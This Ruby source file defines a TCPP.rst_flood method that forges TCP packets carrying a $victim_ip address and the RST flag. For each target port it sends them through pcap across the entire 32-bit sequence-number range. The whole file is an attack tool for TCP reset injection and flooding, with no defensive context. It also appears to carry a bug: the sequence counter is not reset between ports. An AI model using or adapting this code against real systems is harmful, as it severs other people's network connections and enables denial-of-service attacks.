require_relative '../../protocol/tcp_pac.rb'

class TCPP
	def self.rst_flood(pcap, ports, step=1, from_seq=0)
		to_seq = from_seq+2**32

		rst_pac = TCPP.pac_from_pac(TCPP.new){|pac|
			pac.ipv4h.set_addr_by_arr($victim_ip, :src)
			pac.tcph.control_flag = "00000100"
		}

		seq_num = from_seq
		ports.each do |port|
			rst_pac.tcph.src_port = port
			while seq_num<=to_seq
				rst_pac = TCPP.pac_from_pac(rst_pac){|pac|
					pac.tcph.seq_num = seq_num
				}
				pcap.send_packet(rst_pac)
				seq_num += step
			end
		end
	end
end